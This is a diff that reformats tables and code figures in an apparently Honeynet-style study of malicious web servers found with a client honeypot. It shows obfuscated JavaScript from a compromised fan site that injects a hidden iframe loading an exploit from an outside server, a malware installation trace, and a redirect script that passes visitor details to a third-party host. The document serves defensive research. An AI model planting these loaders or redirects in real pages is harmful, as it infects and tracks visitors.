@@ -59,7 +59,18 @@ The list of URLs as well as the keywords used to obtain the URLs are included in
 
 We inspected a little over 300,000 URLs from approximately 150,000 hosts in these categories (approximately 130,000 hosts when accounting for the overlap of hosts between categories. No significant overlap between URLs existed). Table 1 and Figure 3 show the detailed breakdown for the different categories and content areas. With each URL that was inspected by the client honeypot, we recorded the classification of the client honeypot (malicious or benign) as well as any unauthorized state changes that occurred in case an attack by a server was encountered (an example can be found as part of our in-depth analysis of the Keith Jarrett fan site). Unfortunately, we could not determine which vulnerability was actually exploited because analysis tools are still immature and not suitable for an automated analysis.
 
-<table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td valign="bottom" width="121"><strong>Category&nbsp;</strong></td><td valign="bottom" width="80"><strong>Inspected Hosts</strong></td><td valign="bottom" width="80"><strong>Inspected URLs&nbsp;</strong></td></tr><tr><td valign="bottom" width="121">Adult</td><td valign="bottom" width="80">16,375</td><td valign="bottom" width="80">33,999</td></tr><tr><td valign="bottom" width="121">Music</td><td valign="bottom" width="80">13,106</td><td valign="bottom" width="80">49,269</td></tr><tr><td valign="bottom" width="121">News</td><td valign="bottom" width="80">21,188</td><td valign="bottom" width="80">47,224</td></tr><tr><td valign="bottom" width="121">User Content</td><td valign="bottom" width="80">24,331</td><td valign="bottom" width="80">45,835</td></tr><tr><td valign="bottom" width="121">Warez</td><td valign="bottom" width="80">23,530</td><td valign="bottom" width="80">44,870</td></tr><tr><td valign="bottom" width="121">Defacement/Vuln</td><td valign="bottom" width="80">4,844</td><td valign="bottom" width="80">5,151</td></tr><tr><td valign="bottom" width="121">Sponsored Links</td><td valign="bottom" width="80">17,179</td><td valign="bottom" width="80">42,092</td></tr><tr><td valign="bottom" width="121">Typo</td><td valign="bottom" width="80">22,902</td><td valign="bottom" width="80">22,912</td></tr><tr><td valign="bottom" width="121">Spam</td><td valign="bottom" width="80">5,481</td><td valign="bottom" width="80">11,460</td></tr><tr><td valign="bottom" width="121"><strong>Total&nbsp;</strong></td><td valign="bottom" width="80"><strong>148,936&nbsp;</strong></td><td valign="bottom" width="80"><strong>302,812&nbsp;</strong></td></tr></tbody></table>
+| Category           | Inspected Hosts | Inspected URLs |
+|--------------------|-----------------|----------------|
+| Adult              | 16,375          | 33,999         |
+| Music              | 13,106          | 49,269         |
+| News               | 21,188          | 47,224         |
+| User Content       | 24,331          | 45,835         |
+| Warez              | 23,530          | 44,870         |
+| Defacement/Vuln    | 4,844           | 5,151          |
+| Sponsored Links    | 17,179          | 42,092         |
+| Typo               | 22,902          | 22,912         |
+| Spam               | 5,481           | 11,460         |
+| **Total**          | **148,936**     | **302,812**    |
 
 Table 1 - Input URLs/ hosts by category
 
@@ -73,7 +84,17 @@ The percentage of malicious URLs within each category ranged from 0.0002% for pr
 
 Table 2 – Identified malicious URLs/ hosts by category
 
-<table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td valign="bottom" width="115"><strong>Category&nbsp;</strong></td><td valign="bottom" width="72"><strong>Malicious Hosts&nbsp;</strong></td><td valign="bottom" width="72"><strong>Malicious URLs&nbsp;</strong></td><td valign="bottom" width="84"><strong>% Malicious URLs&nbsp;</strong></td></tr><tr><td valign="bottom" width="115">Adult</td><td valign="bottom" width="72">102</td><td valign="bottom" width="72">195</td><td valign="bottom" width="84">0.5735</td></tr><tr><td valign="bottom" width="115">Spam</td><td valign="bottom" width="72">17</td><td valign="bottom" width="72">19</td><td valign="bottom" width="84">0.1658</td></tr><tr><td valign="bottom" width="115">Warez</td><td valign="bottom" width="72">19</td><td valign="bottom" width="72">27</td><td valign="bottom" width="84">0.0602</td></tr><tr><td valign="bottom" width="115">Typo</td><td valign="bottom" width="72">13</td><td valign="bottom" width="72">13</td><td valign="bottom" width="84">0.0567</td></tr><tr><td valign="bottom" width="115">News</td><td valign="bottom" width="72">15</td><td valign="bottom" width="72">20</td><td valign="bottom" width="84">0.0424</td></tr><tr><td valign="bottom" width="115">User Content</td><td valign="bottom" width="72">12</td><td valign="bottom" width="72">13</td><td valign="bottom" width="84">0.0284</td></tr><tr><td valign="bottom" width="115">Music</td><td valign="bottom" width="72">10</td><td valign="bottom" width="72">11</td><td valign="bottom" width="84">0.0223</td></tr><tr><td valign="bottom" width="115">Sponsored Links</td><td valign="bottom" width="72">4</td><td valign="bottom" width="72">7</td><td valign="bottom" width="84">0.0166</td></tr><tr><td valign="bottom" width="115">Defacement/Vuln</td><td valign="bottom" width="72">1</td><td valign="bottom" width="72">1</td><td valign="bottom" width="84">0.0002</td></tr></tbody></table>
+| Category           | Malicious Hosts | Malicious URLs | % Malicious URLs |
+|--------------------|-----------------|----------------|------------------|
+| Adult              | 102             | 195            | 0.5735           |
+| Spam               | 17              | 19             | 0.1658           |
+| Warez              | 19              | 27             | 0.0602           |
+| Typo               | 13              | 13             | 0.0567           |
+| News               | 15              | 20             | 0.0424           |
+| User Content       | 12              | 13             | 0.0284           |
+| Music              | 10              | 11             | 0.0223           |
+| Sponsored Links    | 4               | 7              | 0.0166           |
+| Defacement/Vuln    | 1               | 1              | 0.0002           |
 
 [![figure4](images/Figure4.JPG "figure4")](https://www.honeynet.org/node/160)
 
@@ -129,6 +150,7 @@ The Italian fan site of the jazz pianist and composer Keith Jarrett (http://www.
 
 The exploit that triggers upon visitation of the Keith Jarrett site is not directly contained on the page. We do, however, find a snippet of JavaScript code that “imports” the exploit from a different server onto the page. The snippet of code is shown in Figure 9 and initially doesn’t give much away since it is obfuscated.
 
+```
 <script language=JavaScript>
 function dc(x)= st2 ns = "isiresearchsoft-com/cwyw" />
 {var l=x.length,b=1024,i,j,r,p=0,s=0,w=0,t=Array(63,17,21,4,60,32,52,45,13,28,0,0,0,0,0,0,5,
@@ -139,14 +161,15 @@ function dc(x)= st2 ns = "isiresearchsoft-com/cwyw" />
 dc('TaXRdJBCKAsZdLBysmDpjAdE2ksLdFdCKodbIjX52kBpjl7ZlAIxUxHSwocShxzrs\_7SKjtR
 loHysu9xURcpNUBRhx8pPLHSIjDCPoH5i\_7SPoDRKltEsPVy2aXRdJBCKlM')\\
 </script>
-
+```
 Figure 9 - Obfuscated JavaScript
 
 Because the JavaScript code needs to be converted to clear text in order “import” the exploit, the decryption routine is included within the JavaScript code. This makes it easy to extract the clear text, which is shown in Figure 10. It is a simple hidden iframe that includes the page out.php from the server crunet.biz. From there, we observed several redirects and more obfuscation until we were able to view the actual exploit code.
 
+```
 <iframe src='https://crunet.biz/out.php' width='1' height='1' style='visibility:
  hidden;'></iframe>
-
+```
 Figure 10 - Clear value of obfuscated JavaScript
 
 The obfuscation of the iframe code is one step we encountered frequently, targeted to hide the attack from static analysis tools, such as network based intrusion detection systems. On the Keith Jarrett site, we encountered an additional mechanism that was probably designed to evade detection. Our client honeypot was attacked by www.keithjarrett.it during the initial crawl. However, upon subsequent visits to the same URL, the exploit only triggered on occasion. We suspect that this is a measure to evade client honeypots like ours.
@@ -249,123 +272,22 @@ function startOverflow(num)
 ```
 Figure 12 - Exploit code - portion 2
 
-<table border="1" cellspacing="0" cellpadding="0" align="left">
-
- <tr><td width="56" valign="bottom" bordercolor="#000000"><p><strong>Monitor&nbsp;</strong><strong> </strong></p></td>
-
- <td width="75" valign="bottom" bordercolor="#000000"><p><strong>Action&nbsp;</strong><strong> </strong></p></td>
-
- <td width="247" valign="bottom" bordercolor="#000000"><p><strong>Actor&nbsp;</strong><strong> </strong></p></td>
-
- <td width="246" valign="bottom" bordercolor="#000000"><p><strong>Action parameter&nbsp;</strong><strong> </strong></p></td>
-
- </tr>
-
-<tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>file&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>Write&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\Program    Files\\Internet Explorer\\IEXPLORE.EXE&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\syswcon.exe&nbsp; </p></td>
-
-</tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>process&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>Created&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\Program    Files\\Internet Explorer\\IEXPLORE.EXE&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\syswcon.exe&nbsp; </p></td>
-
-</tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>file&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>Write&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\syswcon.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\drivers\\uzcx.exe&nbsp; </p></td>
-
-</tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>process&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>Created&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\syswcon.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\drivers\\uzcx.exe&nbsp; </p></td>
-
-</tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>process&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>Terminated&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\Program    Files\\Internet Explorer\\IEXPLORE.EXE&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\syswcon.exe&nbsp; </p></td>
-
-</tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>registry&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>SetValueKey&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\drivers\\    uzcx.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>HKCU\\Software\\ewrew\\uzcx\\main\\cid&nbsp; </p></td>
-
-</tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>file&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>Write&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\drivers\\    uzcx.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\Documents    and Settings\\cseifert\\&nbsp; <br />
-
-Local    Settings\\Temporary Internet&nbsp; <br />
- Files\\Content.IE5\\OPUJWX63\\&nbsp; <br />
- benupd32\[1\].exe&nbsp; </p></td>
- </tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>file&nbsp; </p></td>
-
-<td width="75" valign="bottom" bordercolor="#000000"><p>Write&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\drivers\\    uzcx.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\benupd32.exe&nbsp; </p></td>
- </tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>process&nbsp; </p></td>
-
-<td width="75" valign="bottom" bordercolor="#000000"><p>Created&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\drivers\\    uzcx.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\benupd32.exe&nbsp; </p></td>
- </tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>registry&nbsp; </p></td>
-
-<td width="75" valign="bottom" bordercolor="#000000"><p>SetValueKey&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\drivers\\    uzcx.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>HKCU\\Software\\ewrew\\uzcx\\main\\term&nbsp; </p></td>
- </tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>process&nbsp; </p></td>
-
-<td width="75" valign="bottom" bordercolor="#000000"><p>Created&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\benupd32.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\benupd32.exe&nbsp; </p></td>
- </tr>
- <tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>file&nbsp; </p></td>
-
-<td width="75" valign="bottom" bordercolor="#000000"><p>Write&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>&nbsp;</p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\Documents    and Settings\\cseifert\\&nbsp; <br />
- Local    Settings\\Temp\\clean\_33d87.dll&nbsp; </p></td>
- </tr>
- <tr>
-
-<td width="56" valign="bottom" bordercolor="#000000"><p>process&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>Created&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\benupd32.exe&quot;&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\system32\\regsvr32.exe&nbsp; </p></td>
- </tr>
-
-<tr>
- <td width="56" valign="bottom" bordercolor="#000000"><p>registry&nbsp; </p></td>
- <td width="75" valign="bottom" bordercolor="#000000"><p>SetValueKey&nbsp; </p></td>
- <td width="247" valign="bottom" bordercolor="#000000"><p>C:\\WINDOWS\\explorer.exe&nbsp; </p></td>
- <td width="246" valign="bottom" bordercolor="#000000"><p>HKLM\\SYSTEM\\ControlSet001\\Services\\&nbsp; <br />
-
-ldrsvc\\Parameters\\ServiceDll&nbsp; </p></td>
- </tr>
- </table>
+| Monitor  | Action     | Actor                                         | Action parameter                                                                 |
+|----------|------------|-----------------------------------------------|----------------------------------------------------------------------------------|
+| file     | Write      | C:\Program Files\Internet Explorer\IEXPLORE.EXE | C:\syswcon.exe                                                                   |
+| process  | Created    | C:\Program Files\Internet Explorer\IEXPLORE.EXE | C:\syswcon.exe                                                                   |
+| file     | Write      | C:\syswcon.exe                                | C:\WINDOWS\system32\drivers\uzcx.exe                                             |
+| process  | Created    | C:\syswcon.exe                                | C:\WINDOWS\system32\drivers\uzcx.exe                                             |
+| process  | Terminated | C:\Program Files\Internet Explorer\IEXPLORE.EXE | C:\syswcon.exe                                                                   |
+| registry | SetValueKey| C:\WINDOWS\system32\drivers\uzcx.exe          | HKCU\Software\ewrew\uzcx\main\cid                                                |
+| file     | Write      | C:\WINDOWS\system32\drivers\uzcx.exe          | C:\Documents and Settings\cseifert\Local Settings\Temporary Internet Files\Content.IE5\OPUJWX63\benupd32\[1\].exe |
+| file     | Write      | C:\WINDOWS\system32\drivers\uzcx.exe          | C:\WINDOWS\benupd32.exe                                                          |
+| process  | Created    | C:\WINDOWS\system32\drivers\uzcx.exe          | C:\WINDOWS\benupd32.exe                                                          |
+| registry | SetValueKey| C:\WINDOWS\system32\drivers\uzcx.exe          | HKCU\Software\ewrew\uzcx\main\term                                               |
+| process  | Created    | C:\WINDOWS\benupd32.exe                       | C:\WINDOWS\benupd32.exe                                                          |
+| file     | Write      |                                               | C:\Documents and Settings\cseifert\Local Settings\Temp\clean_33d87.dll            |
+| process  | Created    | C:\WINDOWS\benupd32.exe                       | C:\WINDOWS\system32\regsvr32.exe                                                 |
+| registry | SetValueKey| C:\WINDOWS\explorer.exe                       | HKLM\SYSTEM\ControlSet001\Services\ldrsvc\Parameters\ServiceDll                   |
 
 Table 3 - Keith Jarrett attack – observed state changes
 
@@ -418,6 +340,7 @@ Figure 14 - User supplied exploit
 
 The exploit itself follows the same pattern as the one found on the Keith Jarrett site. JavaScript is obfuscated, causes several redirects and then actually triggers the real exploit. The import method, however, is different than the one on the Keith Jarrett site though. Instead of using an iframe that imports the exploit, JavaScript code redirects the user to the page that contains the exploit via a client-side redirect as shown in Figure 15. If this code is combined with obfuscation, as this was the case here, it is difficult to follow the code in an automated fashion. Crawlers or low-interaction client honeypots need to be JavaScript-aware to do so. This technique illustrates the attempts to avoid detection and identification of the attack.
 
+```
 <script language='javascript' STYLE="behavior:url(#default#clientCaps)" ID="oCli entCaps">
  var ref = document.referrer;
  var url = document.URL;
@@ -425,7 +348,7 @@ The exploit itself follows the same pattern as the one found on the Keith Jarret
  window.location.href='http://www.impliedscripting.com/spawn/?r=' +  escape(ref) + '&u=' + escape(url) + '&c=' + escape(oClientCaps.connectionType) + '&cl=' + escape('90716') + '&q=' + escape('interracial cuckold');
  }
  </script>
-
+```
 Figure 15 - Client-side redirect
 
 [![figure16](images/Figure16.JPG "figure16")](https://www.honeynet.org/node/167)
